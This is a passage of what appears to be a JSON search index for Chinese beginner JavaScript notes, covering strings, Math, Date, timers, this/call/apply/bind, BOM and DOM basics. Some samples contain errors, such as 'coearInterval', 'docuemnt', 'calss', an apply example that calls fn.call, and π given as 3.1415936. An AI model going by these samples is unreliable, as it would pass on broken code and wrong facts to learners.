也是用来截取字符串的\",\"语法：substr(从哪个索引开始，截取多少个)\",\"var str = 'hello' // 01234 // 使用 substr 截取字符串 var newStr = str.substr(1, 3) console.log(newStr) // ell \",\"这个方法和 substring 不一样的是，第二个参数是截取多少个，从索引 1 开始，截取 3 个，所以得到的是 ell\"]},{\"header\":\"toLowerCase 和 toUpperCase\",\"slug\":\"tolowercase-和-touppercase\",\"contents\":[\"这两个方法分别使用用来给字符串转成 小写字母 和 大写字母 的\",\"var str = hello // 使用 toUpperCase 转换成大写 var upper = str.toUpperCase() console.log(upper) // HELLO // 使用 toLowerCase 转换成小写 var lower = upper.toLowerCase() console.log(lower) // hello \"]}]},\"/front-end/javascript-notes/14-JavaScript%E5%9F%BA%E7%A1%80-Math.html\":{\"title\":\"JavaScript基础-Math\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"Math 是 JS 的一个内置对象，称为数学对象，提供了一堆的属性和方法帮助我们操作 数字\"]},{\"header\":\"常用方法\",\"slug\":\"常用方法\",\"contents\":[]},{\"header\":\"random\",\"slug\":\"random\",\"contents\":[\"Math.random() 这个方法是用来生成一个 0 ~ 1 之间的随机数，每次执行生成的数字都不一样，但是一定是 0 ~ 1 之间的，生成的数字包含 0 ，但是不包含 1\",\"var num = Math.random() console.log(num) // 得到一个随机数 \",\"//生成0~10的随机数 Math.floor(Math.random() * 11) //生成N~M之间的随机数 Math.floor(Math.random() * (M - N + 1)) + N \"]},{\"header\":\"round\",\"slug\":\"round\",\"contents\":[\"Math.round() 是将一个小数 四舍五入 变成一个整数\",\"var num = 10.1 console.log(Math.round(num)) // 10 var num2 = 10.6 console.log(Math.round(num2)) // 11 \"]},{\"header\":\"abs\",\"slug\":\"abs\",\"contents\":[\"Math.abs() 是返回一个数字的 绝对值\",\"var num = -10 console.log(math.abs(num)) // 10 \"]},{\"header\":\"ceil\",\"slug\":\"ceil\",\"contents\":[\"Math.ceil() 是将一个小数 向上取整 得到的整数\",\"var num = 10.1 console.log(Math.ceil(num)) // 11 var num2 = 10.9 console.log(Math.ceil(num2)) // 11 \"]},{\"header\":\"floor\",\"slug\":\"floor\",\"contents\":[\"Math.floor() 是将一个小数 向下取整 的到的整数\",\"var num = 10.1 console.log(Math.floor(num)) // 10 var num2 = 10.9 console.log(Math.floor(num2)) // 10 \"]},{\"header\":\"max\",\"slug\":\"max\",\"contents\":[\"Math.max() 得到的是你传入的几个数字之中 最大 的那个数字\",\"console.log(Math.max(1, 2, 3, 4, 5)) // 5 \"]},{\"header\":\"min\",\"slug\":\"min\",\"contents\":[\"Math.min() 得到的是你传入的几个数字之中 最小 的那个数字\",\"console.log(Math.min(1, 2, 3, 4, 5)) // 1 \"]},{\"header\":\"pow\",\"slug\":\"pow\",\"contents\":[\"Math.pow()求某个数的多少次方\",\"// 求 4 的 2 次方 console.log(Math.pow(4, 2)) // 16 // 求 2 的 3 次方 console.log(Math.pow(2, 3)) // 8 \"]},{\"header\":\"sqrt\",\"slug\":\"sqrt\",\"contents\":[\"Math.sqrt()求某数的平方根\",\"console.log(Math.sqrt(16))// 4 \"]},{\"header\":\"常用属性\",\"slug\":\"常用属性\",\"contents\":[]},{\"header\":\"PI\",\"slug\":\"pi\",\"contents\":[\"Math.PI 得到的是 π 的值，也就是 3.1415936...\",\"console.log(Math.PI) // 3.141592653589793 \",\"因为计算机的计算精度问题，只能得到小数点后 15 位，使用 Math.PI 的时候，是不需要加 () 的\"]}]},\"/front-end/javascript-notes/15-JavaScript%E5%9F%BA%E7%A1%80-Date.html\":{\"title\":\"JavaScript基础-Date\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"Date对象是JS提供的专门用来获取时间的\"]},{\"header\":\"new Date()\",\"slug\":\"new-date\",\"contents\":[\"new Date() 在不传递参数的情况下是默认返回当前时间\",\"var time = new Date() console.log(time) // 当前时间 Fri Mar 01 2019 13:11:23 GMT+0800 (中国标准时间) \",\"new Date() 在传入参数的时候，可以获取到一个你传递进去的时间\",\"var time = new Date('2019-03-03 13:11:11') console.log(time) // Sun Mar 03 2019 13:11:11 GMT+0800 (中国标准时间) \",\"new Date() 传递的参数有多种情况\",\"传递两个数字，第一个表示年，第二个表示月份\",\"var time = new Date(2019, 00) // 月份从 0 开始计数，0 表示 1月，11 表示 12月 console.log(time) // Tue Jan 01 2019 00:00:00 GMT+0800 (中国标准时间) \",\"传递三个数字，前两个不变，第三个表示该月份的第几天，从 1 到 31\",\"var time = new Date(2019, 00, 05) console.log(time) // Sat Jan 05 2019 00:00:00 GMT+0800 (中国标准时间) \",\"传递四个数字，前三个不变，第四个表示当天的几点，从 0 到 23\",\"var time = new Date(2019, 00, 05, 22) console.log(time) // Sat Jan 05 2019 22:00:00 GMT+0800 (中国标准时间) \",\"传递五个数字，前四个不变，第五个表示的是该小时的多少分钟，从 0 到 59\",\"var time = new Date(2019, 00, 05, 22, 33) console.log(time) // Sat Jan 05 2019 22:33:00 GMT+0800 (中国标准时间) \",\"传递六个数字，前五个不变，第六个表示该分钟的多少秒，从 0 到 59\",\"var time = new Date(2019, 00, 05, 22, 33, 55) console.log(time) // Sat Jan 05 2019 22:33:55 GMT+0800 (中国标准时间) \",\"传入字符串的形式\",\"console.log(new Date('2019')) // Tue Jan 01 2019 08:00:00 GMT+0800 (中国标准时间) console.log(new Date('2019-02')) // Fri Feb 01 2019 08:00:00 GMT+0800 (中国标准时间) console.log(new Date('2019-02-03')) // Sun Feb 03 2019 08:00:00 GMT+0800 (中国标准时间) console.log(new Date('2019-02-03 13:')) // Sun Feb 03 2019 13:00:00 GMT+0800 (中国标准时间) console.log(new Date('2019-02-03 13:13:')) // Sun Feb 03 2019 13:13:00 GMT+0800 (中国标准时间) console.log(new Date('2019-02-03 13:13:13')) // Sun Feb 03 2019 13:13:13 GMT+0800 (中国标准时间) \"]},{\"header\":\"将日期字符串格式化成指定内容\",\"slug\":\"将日期字符串格式化成指定内容\",\"contents\":[\"我们得到的时间字符串是 Sun Feb 03 2019 13:13:13 GMT+0800 (中国标准时间)，我只想得到这个日期中是哪一年，我们就要靠截取字符串的形式得到，但是现在 js 为我们提供了一系列的方法来得到里面的指定内容\"]},{\"header\":\"getFullYear\",\"slug\":\"getfullyear\",\"contents\":[\"getFullYear() 方式是得到指定字符串中的哪一年\",\"var time = new Date(2019, 03, 03, 08, 00, 22) console.log(time.getFullYear()) // 2019 \"]},{\"header\":\"getMonth\",\"slug\":\"getmonth\",\"contents\":[\"getMonth() 方法是得到指定字符串中的哪一个月份\",\"var time = new Date(2019, 03, 03, 08, 00, 22) console.log(time.getMonth()) // 3 \",\"这里要有一个注意的地方，月份是从 0 开始数的，0 表示 1月，1 表示 2月，依此类推\"]},{\"header\":\"getDate\",\"slug\":\"getdate\",\"contents\":[\"getDate() 方法是得到指定字符串中的哪一天\",\"var time = new Date(2019, 03, 03, 08, 00, 22) console.log(time.getDate()) // 3 \"]},{\"header\":\"getHours\",\"slug\":\"gethours\",\"contents\":[\"getHours() 方法是得到指定字符串中的哪小时\",\"var time = new Date(2019, 03, 03, 08, 00, 22) console.log(time.getHours()) // 8 \"]},{\"header\":\"getMinutes\",\"slug\":\"getminutes\",\"contents\":[\"getMinutes() 方法是得到指定字符串中的哪分钟\",\"var time = new Date(2019, 03, 03, 08, 00, 22) console.log(time.getMinutes()) // 0 \"]},{\"header\":\"getSeconds\",\"slug\":\"getseconds\",\"contents\":[\"getSeconds() 方法是得到指定字符串中的哪秒钟\",\"var time = new Date(2019, 03, 03, 08, 00, 22) console.log(time.getSeconds()) // 22 \"]},{\"header\":\"getDay\",\"slug\":\"getday\",\"contents\":[\"getDay() 方法是得到指定字符串当前日期是一周中的第几天（周日是 0，周六是 6）\",\"var time = new Date(2019, 03, 08, 08, 00, 22) console.log(time.getDay()) // 1 \"]},{\"header\":\"getTime\",\"slug\":\"gettime\",\"contents\":[\"getTime() 方法是得到执行时间到 格林威治时间 的毫秒数，即时间戳\",\"var time = new Date(2019, 03, 08, 08, 00, 22) console.log(time.getTime()) // 1554681622000 \",\"其他获取时间戳方法：\",\"+new Date() 方法：\",\"console.log(+new Date()) \",\"now() 方法： 无需实例化，但是只能得到当前的时间戳\",\"console.log(Date.now()) \"]},{\"header\":\"获取时间差\",\"slug\":\"获取时间差\",\"contents\":[\"是指获取两个时间点之间相差的时间，在JS中是不能用时间直接做 减法 的，我们需要一些特殊的操作，在编程的世界里面，有一个特殊的时间，是 1970年01月01日00时00分00秒，这个时间我们叫做 格林威治时间，所有的编程世界里面，这个时间都是一样的，而且 格林威治时间 的数字是 0，从 格林威治时间 开始，每经过1毫秒，数字就会 + 1，所以我们可以获取到任意一个时间节点到 格林威治时间 的毫秒数，然后再用两个毫秒数相减，就能得到两个时间点之间相差的毫秒数，我们再通过这个毫秒数得到准确的时间\"]}]},\"/front-end/javascript-notes/16-JavaScript%E5%9F%BA%E7%A1%80-%E5%AE%9A%E6%97%B6%E5%99%A8.html\":{\"title\":\"JavaScript基础-定时器\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"在 JS 里面，有两种定时器，倒计时定时器 和 间隔定时器\"]},{\"header\":\"倒计时定时器\",\"slug\":\"倒计时定时器\",\"contents\":[\"倒计时多少时间以后执行函数\",\"语法： setTimeout(要执行的函数，多长时间以后执行)\",\"会在你设定的时间以后，执行函数\",\"var timerId = setTimeout(function () { console.log('我执行了') }, 1000) console.log(timerId) // 1 \",\"时间是按照毫秒进行计算的，1000 毫秒就是 1秒钟，所以会在页面打开 1 秒钟以后执行函数，只执行一次，就不再执行了，返回值是当前这个定时器是页面中的第几个定时器，表示定时器的编号\"]},{\"header\":\"间隔定时器\",\"slug\":\"间隔定时器\",\"contents\":[\"每间隔多少时间就执行一次函数\",\"语法： setInterval(要执行的函数，间隔多少时间)\",\"var timerId = setInterval(function () { console.log('我执行了') }, 1000) \",\"时间和刚才一样，是按照毫秒进行计算的，每间隔 1 秒钟执行一次函数，只要不关闭，会一直执行，返回值是，当前这个定时器是页面中的第几个定时器，表示定时器的编号\"]},{\"header\":\"定时器的返回值\",\"slug\":\"定时器的返回值\",\"contents\":[\"设置定时器的时候，它的返回值是部分 setTimeout 和 setInterval 的\",\"只要有一个定时器，那么就是一个数字\",\"var timerId = setTimeout(function () { console.log('倒计时定时器') }, 1000) var timerId2 = setInterval(function () { console.log('间隔定时器') }, 1000) console.log(timerId) // 1 console.log(timerId2) // 2 \"]},{\"header\":\"关闭定时器\",\"slug\":\"关闭定时器\",\"contents\":[\"我们刚才提到过一个 timerId，是表示这个定时器是页面上的第几个定时器\",\"这个 timerId 就是用来关闭定时器的数字\",\"我们有两个方法来关闭定时器 clearTimeout 和 clearInterval\",\"var timerId = setTimeout(function () { console.log('倒计时定时器') }, 1000) clearTimeout(timerId) \",\"关闭以后，定时器就不会再执行了\",\"var timerId2 = setInterval(function () { console.log('间隔定时器') }, 1000) coearInterval(timerId2) \",\"关闭以后定时器就不会再执行了\",\"原则上是clearTimeout 关闭 setTimeout，clearInterval 关闭 setInterval，但是其实是可以通用的，他们可以混着使用\",\"var timerId = setTimeout(function () { console.log('倒计时定时器') }, 1000) // 关闭倒计时定时器 clearInterval(timerId) var timerId2 = setInterval(function () { console.log('间隔定时器') }, 1000) // 关闭间隔定时器 clearTimeout(timerId2) \"]}]},\"/front-end/javascript-notes/17-JavaScript%E5%9F%BA%E7%A1%80-this%E5%85%B3%E9%94%AE%E5%AD%97.html\":{\"title\":\"JavaScript基础-this关键字\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"每一个函数内部都有一个关键字是 this ，可以让我们直接使用的\",\"重点： 函数内部的 this 只和函数的调用方式有关系，和函数的定义方式没有关系\"]},{\"header\":\"this指向\",\"slug\":\"this指向\",\"contents\":[\"函数内部的 this 指向谁，取决于函数的调用方式\",\"全局定义的函数直接调用，this => window\",\"function fn() { console.log(this) } fn() // 此时 this 指向 window \",\"对象内部的方法调用，this => 调用者\",\"var obj = { fn: function () { console.log(this) } } obj.fn() // 此时 this 指向 obj \",\"定时器的处理函数，this => window\",\"setTimeout(function () { console.log(this) }, 0) // 此时定时器处理函数里面的 this 指向 window \",\"事件处理函数，this => 事件源\",\"div.onclick = function () { console.log(this) } // 当你点击 div 的时候，this 指向 div \",\"自调用函数（立即执行函数），this => window\",\"(function () { console.log(this) })() // 此时 this 指向 window \"]},{\"header\":\"call 和 apply 和 bind\",\"slug\":\"call-和-apply-和-bind\",\"contents\":[\"刚才我们说过的都是函数的基本调用方式里面的 this 指向，我们还有三个可以忽略函数本身的 this 指向转而指向别的地方，这三个方法就是 call 、 apply 、 bind，它们是强行改变 this 指向的方法\"]},{\"header\":\"call\",\"slug\":\"call\",\"contents\":[\"call 方法是附加在函数调用后面使用，可以忽略函数本身的 this 指向\",\"语法： 函数名.call(要改变的 this 指向，要给函数传递的参数1，要给函数传递的参数2， ...)\",\"var obj = { name: 'Jack' } function fn(a, b) { console.log(this) console.log(a) console.log(b) } fn(1, 2) fn.call(obj, 1, 2) \",\"fn() 的时候，函数内部的 this 指向 window，fn.call(obj, 1, 2) 的时候，函数内部的 this 就指向了 obj 这个对象，使用 call 方法的时候会立即执行函数，第一个参数是你要改变的函数内部的 this 指向，第二个参数开始，依次是向函数传递参数\"]},{\"header\":\"apply\",\"slug\":\"apply\",\"contents\":[\"apply 方法是附加在函数调用后面使用，可以忽略函数本身的 this 指向\",\"语法： 函数名.apply(要改变的 this 指向，[要给函数传递的参数1， 要给函数传递的参数2， ...])\",\"var obj = { name: 'Jack' } function fn(a, b) { console.log(this) console.log(a) console.log(b) } fn(1, 2) fn.call(obj, [1, 2]) \",\"fn() 的时候，函数内部的 this 指向 window，fn.apply(obj, [1, 2]) 的时候，函数内部的 this 就指向了 obj 这个对象，使用 apply 方法的时候，会立即执行函数，第一个参数是你要改变的函数内部的 this 指向，第二个参数是一个 数组，数组里面的每一项依次是向函数传递的参数\"]},{\"header\":\"bind\",\"slug\":\"bind\",\"contents\":[\"bind 方法是附加在函数调用后面使用，可以忽略函数本身的 this 指向，和 call、apply 有一些不一样，就是不会立即执行函数，而是返回一个已经改变了 this 指向的函数\",\"语法： var newFn = 函数名.bind(要改变的 this 指向); newFn(传递参数)\",\"var obj = { name: 'Jack' } function fn(a, b) { console.log(this) console.log(a) console.log(b) } fn(1, 2) var newFn = fn.bind(obj) newFn(1, 2) \",\"bind 调用的时候，不会执行 fn 这个函数，而是返回一个新的函数，这个新的函数就是一个改变了 this 指向以后的 fn 函数，fn(1, 2) 的时候 this 指向 window，newFn(1, 2) 的时候执行的是一个和 fn 一摸一样的函数，只不过里面的 this 指向改成了 obj\"]}]},\"/front-end/javascript-notes/18-BOM.html\":{\"title\":\"BOM\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"BOM（Browser Object Model）： 浏览器对象模型\",\"其实就是操作浏览器的一些能力\",\"我们可以操作哪些内容？\",\"获取一些浏览器的相关信息（窗口的大小）\",\"操作浏览器进行页面跳转\",\"获取当前浏览器地址栏的信息\",\"操作浏览器的滚动条\",\"浏览器的信息（浏览器的版本）\",\"让浏览器出现一个弹出框（alert / confirm / prompt）\",\"……\",\"BOM 的核心就是 window 对象，window 是浏览器内置的一个对象，里面包含着操作浏览器的方法\"]},{\"header\":\"获取浏览器窗口的尺寸\",\"slug\":\"获取浏览器窗口的尺寸\",\"contents\":[\" innerHeight 和 innerWidth\",\"这两个方法分别是用来获取浏览器窗口的宽度和高度（包含滚动条的）\",\"var windowHeight = window.innerHeight console.log(windowHeight) var windowWidth = window.innerWidth console.log(windowWidth) \"]},{\"header\":\"浏览器的弹出层\",\"slug\":\"浏览器的弹出层\",\"contents\":[\"alert 是在浏览器弹出一个提示框\",\"window.alert('我是一个提示框') \",\"这个弹出层只是一个提示内容，只有一个确定按钮\",\"点击确定按钮以后，这个提示框就消失了\",\"confirm 是在浏览器弹出一个询问框\",\"var boo = window.confirm('我是一个询问框') console.log(boo) \",\"这个弹出层有一个询问信息和两个按钮\",\"当你点击确定的时候，就会得到 true\",\"当你点击取消的时候，就会得到 false\",\"prompt 是在浏览器弹出一个输入框\",\"var str = window.prompt('请输入内容') console.log(str) \",\"这个弹出层有一个输入框和两个按钮\",\"当你点击取消的时候，得到的是 null\",\"当你点击确定的时候得到的就是你输入的内容\"]},{\"header\":\"浏览器的地址信息\",\"slug\":\"浏览器的地址信息\",\"contents\":[\"在 window 中有一个对象叫做 location，就是专门用来存储浏览器的地址栏内的信息的\"]},{\"header\":\"location.href\",\"slug\":\"location-href\",\"contents\":[\"location.href 这个属性存储的是浏览器地址栏内 url 地址的信息\",\"console.log(window.location.href) \",\"会把中文变成 url 编码的格式\",\"location.href 这个属性也可以给它赋值，赋值时用于地址的跳转\",\"window.location.href = './index.html' // 这个就会跳转页面到后面你给的那个地址 \"]},{\"header\":\"location.search\",\"slug\":\"location-search\",\"contents\":[\"location.search这个属性用于获取地址中携带的参数，符号 ？后面部分\"]},{\"header\":\"location.hash\",\"slug\":\"location-hash\",\"contents\":[\"location.hash这个属性用于获取地址中的哈希值，符号 # 后面部分\"]},{\"header\":\"location.reload\",\"slug\":\"location-reload\",\"contents\":[\"location.reload() 这个方法会重新加载一遍页面，就相当于刷新，传入参数 true 时表示强制刷新\",\"window.location.reload() \",\"注意： 不要写在全局，不然浏览器就会一直处在刷新状态\"]},{\"header\":\"浏览器的历史记录\",\"slug\":\"浏览器的历史记录\",\"contents\":[\"window 中有一个对象叫做 history，是专门用来存储历史记录信息的\"]},{\"header\":\"history.back\",\"slug\":\"history-back\",\"contents\":[\"history.back 是用来回退历史记录的，就是回到前一个页面，就相当于浏览器上的 ⬅️ 按钮\",\"window.history.back() \",\"前提是你要有上一条记录，不然就是一直在这个页面，也不会回退\"]},{\"header\":\"history.forword\",\"slug\":\"history-forword\",\"contents\":[\"history.forword 是去到下一个历史记录里面，也就是去到下一个页面，就相当于浏览器上的 ➡️ 按钮\",\"window.history.forward() \",\"前提是你要之前有过回退操作，不然的话你现在就是最后一个页面，没有下一个\"]},{\"header\":\"history.go\",\"slug\":\"history-go\",\"contents\":[\"history.go(参数)用来前进和后退，参数如果是 1 前进一个页面，如果是 -1 后退一个页面\"]},{\"header\":\"浏览器的onload 事件\",\"slug\":\"浏览器的onload-事件\",\"contents\":[\"这个不再是对象了，而是一个事件，是在页面所有资源加载完毕后执行的\",\"window.onload = function () { console.log('页面已经加载完毕') } \"]},{\"header\":\"在 html 页面中把 JS 写在 head 里面\",\"slug\":\"在-html-页面中把-js-写在-head-里面\",\"contents\":[\"<html> <head> <meta charset=\\\"UTF-8\\\" /> <script> // 这个代码执行的时候，body 还没有加载 // 这个时候我们就获取不到 body 中的那个 div // 就需要使用 window.onload 事件 window.onload = function () { // 这个函数会在页面加载完毕以后在执行 // 那么这个时候页面的 DOM 元素都已经加载了，我们就可以获取 div 了 } </script> </head> <body> <div></div> </body> </html> \"]},{\"header\":\"在 html 页面中把 JS 写在 body 最后面\",\"slug\":\"在-html-页面中把-js-写在-body-最后面\",\"contents\":[\"<html> <head> <meta charset=\\\"UTF-8\\\" /> </head> <body> <div></div> <script> // 这个代码执行的时候，body 已经加载完毕了 // 在这里就可以获取到 div，写不写 window.onload 就无所谓了 window.onload = function () { // 这个函数会在页面加载完毕以后在执行 // 那么这个时候页面的 DOM 元素都已经加载了，我们就可以获取 div 了 } </script> </body> </html> \"]},{\"header\":\"浏览器的 onscroll 事件\",\"slug\":\"浏览器的-onscroll-事件\",\"contents\":[\"这个 onscroll 事件是当浏览器的滚动条滚动的时候触发或者鼠标滚轮滚动的时候触发\",\"window.onscroll = function () { console.log('浏览器滚动了') } \",\"注意：前提是页面的高度要超过浏览器的可是窗口才可以\"]},{\"header\":\"浏览器滚动的距离\",\"slug\":\"浏览器滚动的距离\",\"contents\":[\"浏览器内的内容既然可以滚动，那么我们就可以获取到浏览器滚动的距离\",\"浏览器真的滚动了吗？\",\"其实我们的浏览器是没有滚动的，是一直在那里，那么滚动的是什么？是我们的页面\",\"，所以说，其实浏览器没有动，只不过是页面向上走了，所以，这个已经不能单纯的算是浏览器的内容了，而是我们页面的内容，所以不是在用 window 对象了，而是使用 document 对象\"]},{\"header\":\"scrollTop\",\"slug\":\"scrolltop\",\"contents\":[\"获取的是页面向上滚动的距离\",\"一共有两个获取方式\",\"document.body.scrollTop\",\"document.documentElement.scrollTop\",\"window.onscroll = function () { console.log(document.body.scrollTop) console.log(document.documentElement.scrollTop) } \",\"区别：\",\"IE 浏览器 \",\"没有 DOCTYPE 声明的时候，用这两个都行\",\"有 DOCTYPE 声明的时候，只能用 document.documentElement.scrollTop\",\"Chrome 和 FireFox \",\"没有 DOCTYPE 声明的时候，用 document.body.scrollTop\",\"有 DOCTYPE 声明的时候，用 document.documentElement.scrollTop\",\"Safari \",\"两个都不用，使用一个单独的方法 window.pageYOffset \"]},{\"header\":\"scrollLeft\",\"slug\":\"scrollleft\",\"contents\":[\"获取页面向左滚动的距离\",\"两个方法\",\"document.body.scrollLeft\",\"document.documentElementLeft\",\"window.onscroll = function () { console.log(document.body.scrollLeft) console.log(document.documentElement.scrollLeft) } \"]},{\"header\":\"本地存储\",\"slug\":\"本地存储\",\"contents\":[\"本地存储：将数据存储在本地浏览器中\",\"优点：\",\"页面刷新或者关闭不丢失数据，实现数据持久化\",\"容量较大，sessionStorage 和 localStorage 约 5M 左右\"]},{\"header\":\"localStorage\",\"slug\":\"localstorage\",\"contents\":[\"作用: 数据可以长期保留在本地浏览器中，刷新页面和关闭页面，数据也不会丢失, 除非手动删除\",\"特性：可以多窗口共享（同一浏览器可以共享），以键值对的形式存储，并且存储的是字符串，省略了 window\",\"语法： 存储数据：\",\"localStorage.setItem(key, value) \",\"获取数据：\",\"localStorage.getItem(key) \",\"删除数据：\",\"localStorage.removeItem(key) \",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\"> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\"> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\"> <title>本地存储-localstorage</title> </head> <body> <script> // 本地存储 - localstorage 存储的是字符串 // 1. 存储 localStorage.setItem('age', 18) // 2. 获取 console.log(typeof localStorage.getItem('age')) // 3. 删除 localStorage.removeItem('age') </script> </body> </html> \",\"可以在浏览器使用 F12，通过 Application 查看本地数据\"]},{\"header\":\"sessionStorage\",\"slug\":\"sessionstorage\",\"contents\":[\"特性：\",\"生命周期为关闭浏览器窗口\",\"在同一个窗口（页面）下数据可以共享\",\"以键值对的形式存储使用\",\"用法跟 localStorage 基本相同\",\"语法：\",\"// 存储 sessionStorage.setItem(key,value) // 获取 sessionStorage.getItem(key) // 删除 sessionStorage.removeItem(key) \"]},{\"header\":\"localStorage 存储复杂数据类型\",\"slug\":\"localstorage-存储复杂数据类型\",\"contents\":[\"问题：本地只能存储字符串, 无法存储复杂数据类型\",\"解决方法：需要将复杂数据类型转换成 JSON 字符串, 再存储到本地\",\"语法：JSON.stringify(复杂数据类型)\",\"JSON 字符串：\",\"首先是1个字符串\",\"属性名使用双引号引起来，不能单引号\",\"属性值如果是字符串型也必须双引号\",\"<body> <script> // 本地存储复杂数据类型 var goods = { name: '小米', price: 1999 } // localStorage.setItem('goods', goods) // console.log(localStorage.getItem('goods')) // 1. 把对象转换为JSON字符串 JSON.stringify localStorage.setItem('goods', JSON.stringify(goods)) // console.log(typeof localStorage.getItem('goods')) </script> </body> \",\"问题：因为本地存储里面取出来的是字符串，不是对象，无法直接使用\",\"解决：把取出来的字符串转换为对象\",\"语法：JSON.parse(JSON字符串)\",\"<body> <script> // 本地存储复杂数据类型 var goods = { name: '小米', price: 1999 } // localStorage.setItem('goods', goods) // console.log(localStorage.getItem('goods')) // 1. 把对象转换为JSON字符串 JSON.stringify localStorage.setItem('goods', JSON.stringify(goods)) // console.log(typeof localStorage.getItem('goods')) // 2. 把JSON字符串转换为对象 JSON.parse console.log(JSON.parse(localStorage.getItem('goods'))) </script> </body> \"]}]},\"/front-end/javascript-notes/19-DOM.html\":{\"title\":\"DOM\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"DOM（Document Object Model）： 文档对象模型\",\"其实就是操作 html 中的标签的一些能力\",\"我们可以操作哪些内容？\",\"获取一个元素\",\"移除一个元素\",\"创建一个元素\",\"向页面里面添加一个元素\",\"给元素绑定一些事件\",\"获取元素的属性\",\"给元素添加一些 css 样式\",\"...\",\"DOM 的核心对象就是 docuemnt 对象\",\"document 对象是浏览器内置的一个对象，里面存储着专门用来操作元素的各种方法\",\"DOM对象： 页面中的标签，我们通过 JS 获取到以后，就把这个对象叫做 DOM 对象\"]},{\"header\":\"获取一个元素\",\"slug\":\"获取一个元素\",\"contents\":[\"通过 JS 代码来获取页面中的标签，获取到以后我们就可以操作这些标签了\"]},{\"header\":\"getElementById\",\"slug\":\"getelementbyid\",\"contents\":[\"getElementById 是通过标签的 id 名称来获取标签的\",\"因为在一个页面中 id 是唯一的，所以获取到的就是一个元素\",\"<body> <div id=\\\"box\\\"></div> <script> // 获取到的就是页面中的那个 id 为 box 的 div 标签 var box = document.getElementById('box') console.log(box) // <div></div> </script> </body> \"]},{\"header\":\"getElementsByClassName\",\"slug\":\"getelementsbyclassname\",\"contents\":[\"getElementsByClassName 是通过标签的 class 名称来获取标签的\",\"因为页面中可能有多个元素的 class 名称一样，所以获取到的是一组元素\",\"哪怕你获取的 class 只有一个，那也是获取一组元素，只不过这一组中只有一个 DOM 元素而已\",\"<body> <div calss=\\\"box\\\"></div> <script> var box = document.getElementsByClassName('box') console.log(box) // [<div></div>] console.log(box[0]) // <div></div> </script> </body> \",\"获取到的是一组元素，是一个长得和数组一样的数据结构，但是不是数组，是 伪数组，这组数据也是按照索引排列的，所以我们想要准确的拿到这个 div，需要用索引来获取\"]},{\"header\":\"getElementsByTagName\",\"slug\":\"getelementsbytagname\",\"contents\":[\"getElementsByTagName 是用过标签的标签名称来获取标签的\",\"因为页面中可能有多个元素的标签名称一样，所以获取到的是一组元素\",\"哪怕只有一个这个标签名，那么也是获取一组元素，只不过这一组中只有一个 DOM 元素而已\",\"<body> <div></div> <script> var box = document.getElementsByTagName('div') console.log(box) // [<div></div>] console.log(box[0]) // <div></div> </script> </body> \",\"和 getElementsByClassName 一样，获取到的是一个长得很像数组的元素，必须要用索引才能得到准确的 DOM 元素\"]},{\"header\":\"querySelector\",\"slug\":\"queryselector\",\"contents\":[\"querySelector 是按照选择器的方式来获取元素，也就是说，按照我们写 CSS 的时候的选择器来获取\",\"这个方法只能获取到一个元素，并且是页面中第一个满足条件的元素\",\"console.log(document.querySelector('div')) // 获取页面中的第一个 div 元素 console.log(docuemnt.querySelector('.box')) // 获取页面中第一个有 box 类名的元素 console.log(document.querySelector('#box')) // 获取页面中第一个 id 名为 box 的元素 \"]},{\"header\":\"querySelectorAll\",\"slug\":\"queryselectorall\",\"contents\":[\"querySelectorAll 是按照选择器的方式来获取元素\",\"这个方法能获取到所有满足条件的元素，以一个伪数组的形式返回\",\"console.log(document.querySelectorAll('div')) // 获取页面中的所有的 div 元素 console.log(docuemnt.querySelectorAll('.box')) // 获取页面中所有有 box 类名的元素 \",\"获取到的是一组数据，也是需要用索引来获取到准确的每一个 DOM 元素，或者是用遍历的方式获得，没有 pop()push() 等数组方法\"]},{\"header\":\"操作元素的属性\",\"slug\":\"操作元素的属性\",\"contents\":[\"通过我们各种获取元素的方式获取到页面中的标签以后，我们可以通过操作 DOM 元素的属性，就能直接把效果展示在页面上\"]},{\"header\":\"innerHTML\",\"slug\":\"innerhtml\",\"contents\":[\"获取元素内部的 HTML 结构\",\"<body> <div> <p> <span>hello</span> </p> </div> <script> var div = document.querySelector('div') console.log(div.innerHTML) /* <p> <span>hello</span> </p> */ </script> </body> \",\"设置元素的内容\",\"<body> <div></div> <script> var div = document.querySelector('div') div.innerHTML = '<p>hello</p>' </script> </body> \",\"设置完以后，页面中的 div 元素里面就会嵌套一个 p 元素\"]},{\"header\":\"innerText\",\"slug\":\"innertext\",\"contents\":[\"获取元素内部的文本（只能获取到文本内容，获取不到 html 标签）\",\"<body> <div> <p> <span>hello</span> </p> </div> <script> var div = document.querySelector('div') console.log(div.innerText) // hello </script> </body> \",\"可以设置元素内部的文本\",\"<body> <div></div> <script> var div = document.querySelector('div') div.innerText = '<p>hello</p>' </script> </body> \",\"设置完毕以后，会把 <p>hello</p> 当作一个文本出现在 div 元素里面，而不会把 p 解析成标签\"]},{\"header\":\"操作元素常用属性\",\"slug\":\"操作元素常用属性\",\"contents\":[\"语法：\",\"对象.属性 = 值 \",\"例：\",\"<img src=\\\"./images/1.webp\\\" alt=\\\"\\\" /> \",\"//1.获取图片元素 var img = document.querySelector('img') //2.修改图片对象的属性 img.src = './images/2.webp' img.title = '小刘' \"]},{\"header\":\"getAttribute\",\"slug\":\"getattribute\",\"contents\":[\"获取元素的某个属性（包括自定义属性）\",\"<body> <div a=\\\"100\\\" class=\\\"box\\\"></div> <script> var div = document.querySelector('div') console.log(div.getAttribute('a')) // 100 console.log(div.getAttribute('class')) // box </script> </body> \"]},{\"header\":\"setAttribute\",\"slug\":\"setattribute\",\"contents\":[\"给元素设置一个属性（包括自定义属性）\",\"<body> <div></div> <script> var div = document.querySelector('div') div.setAttribute('a', 100) div.setAttribute('class', 'box') console.log(div) // <div a=\\\"100\\\" class=\\\"box\\\"></div> </script> </body> \"]},{\"header\":\"removeAttribute\",\"slug\":\"removeattribute\",\"contents\":[\"直接移除元素的某个属性\",\"<body> <div a=\\\"100\\\" class=\\\"box\\\"></div> <script> var div = document.querySelector('div') div.removeAttribute('class') 